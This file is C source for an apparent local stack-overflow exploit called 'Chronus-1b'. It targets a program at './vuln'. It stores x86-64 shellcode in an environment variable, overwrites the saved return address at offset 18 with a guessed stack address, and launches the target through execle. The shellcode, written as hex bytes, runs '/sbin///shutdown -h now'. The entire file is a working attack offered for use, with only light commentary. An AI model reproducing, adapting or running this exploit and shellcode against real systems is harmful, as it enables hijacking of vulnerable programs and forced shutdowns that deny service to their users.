#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define VULN "./vuln" // Path to the vulnerable binary
#define SIZE 200 // Size of the payload
#define OFFSET 18 // Buffer size (10) + saved RBP (8)

char sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
             "\x77\x66\x68\x6e\x6f\x48\x89\xe3"
             "\x50\x66\x68\x2d\x68\x48\x89\xe1"
             "\x50\x49\xb8\x2f\x73\x62\x69\x6e"
             "\x2f\x2f\x2f\x49\xba\x73\x68\x75"
             "\x74\x64\x6f\x77\x6e\x41\x52\x41"
             "\x50\x48\x89\xe7\x52\x53\x51\x57"
             "\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
             "\x05";
int sclen = sizeof(sc) - 1;

int main(int argc, char *argv[]) {
    char p[SIZE];
    char *env[] = {sc, NULL};
    char *vuln[] = {VULN, p, NULL};

    // Create a NOP sled
    char nop_sled[SIZE];
    memset(nop_sled, 0x90, SIZE - sclen - 1); // Fill the buffer with NOP instructions
    memcpy(nop_sled + SIZE - sclen - 1, sc, sclen); // Place the shellcode at the end of the NOP sled
    nop_sled[SIZE - 1] = '\0'; // Null-terminate the buffer

    // Calculate the return address to overwrite
    unsigned long ret = 0x7fffffffe000 - strlen(nop_sled) - strlen(VULN); // Adjust this address as needed
    fprintf(stderr, "[***] Using address: %#018lx\n", ret); // Print the return address

    // Create the payload
    char payload[OFFSET + 8 + 1]; // Buffer size + saved RBP + return address + null terminator
    memset(payload, 0x90, OFFSET); // Fill with NOPs
    *((unsigned long *)(payload + OFFSET)) = ret; // Overwrite return address
    payload[OFFSET + 8] = '\0'; // Null-terminate the payload

    vuln[1] = payload;

    printf("Chronus-1b\n");
    printf("Designed by poet5.\n\n");
    printf("Running exploit...\n");

    execle(vuln[0], vuln[0], payload, NULL, env);
    perror("execle"); // If execle fails, print error

    return 0;
}
